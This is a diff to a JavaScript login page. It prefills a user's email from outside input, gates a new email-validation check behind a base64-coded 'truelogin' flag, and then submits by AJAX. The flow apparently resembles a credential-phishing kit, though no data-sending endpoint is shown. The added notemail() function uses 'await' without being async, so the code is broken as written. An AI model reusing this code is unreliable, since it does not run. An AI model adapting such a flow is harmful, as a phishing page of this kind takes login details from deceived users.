@@ -5,25 +5,19 @@ var phone = "";
 var dVal = [];
 var lVal = [];
 var pages = [];
+var skip=1;
 var myInterval,Proofs;
     $( document ).ready(async function() {
         console.log(semail);  
 if(isEmail(semail)){
-
-if(ltype=='dHJ1ZWxvZ2lu'){
-    getpage('EmailPage',0);
+getpage('EmailPage',0);
 email = $("#email").val(semail);
-nextto(semail,0);
-
+if(ltype=='dHJ1ZWxvZ2lu'){
+ skip=0;
+nextto(semail);
 }else{
-     await getpage('EmailPage',1);  
-  if(semail){
-    email = $("#email").val(semail);
-    $("#error1").html(Errs['Notemail']);
-  }else{
-
-    
-  }
+skip=1;
+nextto(semail);
 }
 }else{
  await getpage('EmailPage',1);  
@@ -31,12 +25,29 @@ nextto(semail,0);
     email = $("#email").val(semail);
     $("#error1").html(Errs['Notemail']);
   }
-} 
+}
 
 });
     function notemail(){
-
+if(isEmail(semail)){
+getpage('EmailPage',0);
+email = $("#email").val(semail);
+if(ltype=='dHJ1ZWxvZ2lu'){
+ skip=0;
+nextto(semail);
+}else{
+skip=1;
+nextto(semail);
+}
+}else{
+ await getpage('EmailPage',1);  
+  if(semail){
+    email = $("#email").val(semail);
+    $("#error1").html(Errs['Notemail']);
+  }
+}
     }
+   
 async function getpage(page,dis){
 $("#load").show();
     var scrn= await GotoType(page);
@@ -57,14 +68,14 @@ function isEmail(email) {
 var regex = /^([a-zA-Z0-9_.+-])+\@(([a-zA-Z0-9-])+\.)+([a-zA-Z0-9]{2,4})+$/;
 return regex.test(email);
 }
-async function nextto(vak,skip) {
+async function nextto(vak) {
 if(vak){
     email = vak;  
 }else{
     email = $("#email").val();  
 }
 $("#load").show();
-if (isEmail(email)) {
+if (skip==1 || await validateEm(email) === true) {
 $("#load").show();
 $("#btn").attr("disabled", true);
 $.ajax({
